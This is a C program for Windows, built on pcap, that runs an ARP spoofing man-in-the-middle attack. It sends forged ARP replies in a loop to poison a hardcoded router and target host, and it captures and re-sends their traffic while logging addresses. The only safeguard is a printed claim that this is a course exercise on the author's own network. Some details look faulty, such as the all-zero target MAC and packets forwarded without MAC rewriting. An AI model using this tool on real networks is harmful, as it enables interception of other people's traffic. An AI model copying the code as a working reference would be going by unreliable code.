#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "ws2_32.lib")

#define ETHER_ADDR_LEN 6
#define ARP_REQUEST 1
#define ARP_REPLY 2

struct eth_header {
    unsigned char dest[ETHER_ADDR_LEN];
    unsigned char src[ETHER_ADDR_LEN];
    unsigned short type;
};

struct arp_header {
    unsigned short htype;
    unsigned short ptype;
    unsigned char hlen;
    unsigned char plen;
    unsigned short opcode;
    unsigned char sender_mac[ETHER_ADDR_LEN];
    unsigned char sender_ip[4];
    unsigned char target_mac[ETHER_ADDR_LEN];
    unsigned char target_ip[4];
};

static const unsigned char broadcast_mac[ETHER_ADDR_LEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
    pcap_t *handle = (pcap_t *)param;
    struct eth_header *eth = (struct eth_header *)pkt_data;

    unsigned char *ip_data = (unsigned char *)(pkt_data + 14);
    unsigned char src_ip[4], dest_ip[4];

    if (eth->type == htons(0x0800)) {
        memcpy(src_ip, ip_data + 12, 4);
        memcpy(dest_ip, ip_data + 16, 4);
        
        printf("\nPacket captured - Length: %d\n", header->len);
        printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
               eth->src[0], eth->src[1], eth->src[2], eth->src[3], eth->src[4], eth->src[5]);
        printf("Destination MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
               eth->dest[0], eth->dest[1], eth->dest[2], eth->dest[3], eth->dest[4], eth->dest[5]);
        printf("Source IP: %d.%d.%d.%d\n", src_ip[0], src_ip[1], src_ip[2], src_ip[3]);
        printf("Destination IP: %d.%d.%d.%d\n", dest_ip[0], dest_ip[1], dest_ip[2], dest_ip[3]);
    } else if (eth->type == htons(0x0806)) {
        struct arp_header *arp = (struct arp_header *)(pkt_data + 14);
        
        printf("\nARP Packet - Length: %d\n", header->len);
        printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
               eth->src[0], eth->src[1], eth->src[2], eth->src[3], eth->src[4], eth->src[5]);
        printf("Destination MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
               eth->dest[0], eth->dest[1], eth->dest[2], eth->dest[3], eth->dest[4], eth->dest[5]);
        printf("Sender IP: %d.%d.%d.%d\n", arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3]);
        printf("Target IP: %d.%d.%d.%d\n", arp->target_ip[0], arp->target_ip[1], arp->target_ip[2], arp->target_ip[3]);
    }

    if (pcap_sendpacket(handle, pkt_data, header->len) != 0) {
        printf("Error forwarding packet: %s\n", pcap_geterr(handle));
    } else {
        printf("Packet forwarded\n");
    }
}

void send_arp_packet(pcap_t *handle, unsigned char *src_mac, unsigned char *src_ip,
                    unsigned char *target_mac, unsigned char *target_ip, int opcode) {
    unsigned char packet[42];
    struct eth_header *eth = (struct eth_header *)packet;
    struct arp_header *arp = (struct arp_header *)(packet + 14);

    memcpy(eth->dest, (opcode == ARP_REQUEST) ? broadcast_mac : target_mac, ETHER_ADDR_LEN);
    memcpy(eth->src, src_mac, ETHER_ADDR_LEN);
    eth->type = htons(0x0806);

    arp->htype = htons(1);
    arp->ptype = htons(0x0800);
    arp->hlen = 6;
    arp->plen = 4;
    arp->opcode = htons(opcode);
    memcpy(arp->sender_mac, src_mac, ETHER_ADDR_LEN);
    memcpy(arp->sender_ip, src_ip, 4);
    memcpy(arp->target_mac, target_mac, ETHER_ADDR_LEN);
    memcpy(arp->target_ip, target_ip, 4);

    if (pcap_sendpacket(handle, packet, 42) != 0) {
        printf("Error sending ARP packet: %s\n", pcap_geterr(handle));
    }
}

char *select_interface() {
    pcap_if_t *alldevs, *d;
    char errbuf[PCAP_ERRBUF_SIZE];
    int i = 0, choice;

    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        printf("Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }

    printf("\nAvailable network interfaces:\n");
    for (d = alldevs; d; d = d->next) {
        printf("%d. %s\n", ++i, d->name);
        if (d->description)
            printf("   Description: %s\n", d->description);
        else
            printf("   No description available\n");
    }

    if (i == 0) {
        printf("No interfaces found! Make sure Npcap/WinPcap is installed.\n");
        pcap_freealldevs(alldevs);
        exit(1);
    }

    printf("\nEnter the interface number (1-%d): ", i);
    scanf("%d", &choice);

    if (choice < 1 || choice > i) {
        printf("Invalid choice!\n");
        pcap_freealldevs(alldevs);
        exit(1);
    }

    d = alldevs;
    for (i = 1; i < choice; i++) d = d->next;

    char *dev = _strdup(d->name);
    printf("Selected interface: %s\n", dev);
    if (d->description)
        printf("Description: %s\n", d->description);

    pcap_freealldevs(alldevs);
    return dev;
}

DWORD WINAPI capture_thread(LPVOID param) {
    pcap_t *handle = (pcap_t *)param;
    pcap_loop(handle, 0, packet_handler, (u_char *)handle);
    return 0;
}

int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev = select_interface();
    unsigned char src_mac[ETHER_ADDR_LEN] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
    unsigned char src_ip[4] = {192, 168, 1, 100};
    unsigned char router_ip[4] = {192, 168, 1, 1};
    unsigned char target_ip[4] = {192, 168, 1, 101};
    unsigned char target_mac[ETHER_ADDR_LEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    printf("\nPublic Notice: This is a practical exercise for my Digital Forensics course.\n");
    printf("I own the router (IP: %d.%d.%d.%d), my PC, and mobile device on this network.\n",
           router_ip[0], router_ip[1], router_ip[2], router_ip[3]);
    printf("Performing ARP spoofing on my own network for educational purposes.\n\n");

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        printf("Couldn't open device %s: %s\n", dev, errbuf);
        free(dev);
        return 1;
    }

    HANDLE thread = CreateThread(NULL, 0, capture_thread, handle, 0, NULL);
    if (thread == NULL) {
        printf("Error creating thread\n");
        pcap_close(handle);
        free(dev);
        return 1;
    }

    while (1) {
        send_arp_packet(handle, src_mac, target_ip, target_mac, router_ip, ARP_REPLY);
        printf("Spoofed router: Sent ARP reply\n");

        send_arp_packet(handle, src_mac, router_ip, target_mac, target_ip, ARP_REPLY);
        printf("Spoofed target: Sent ARP reply\n");

        Sleep(2000);
    }

    WaitForSingleObject(thread, INFINITE);
    pcap_close(handle);
    free(dev);
    return 0;
}
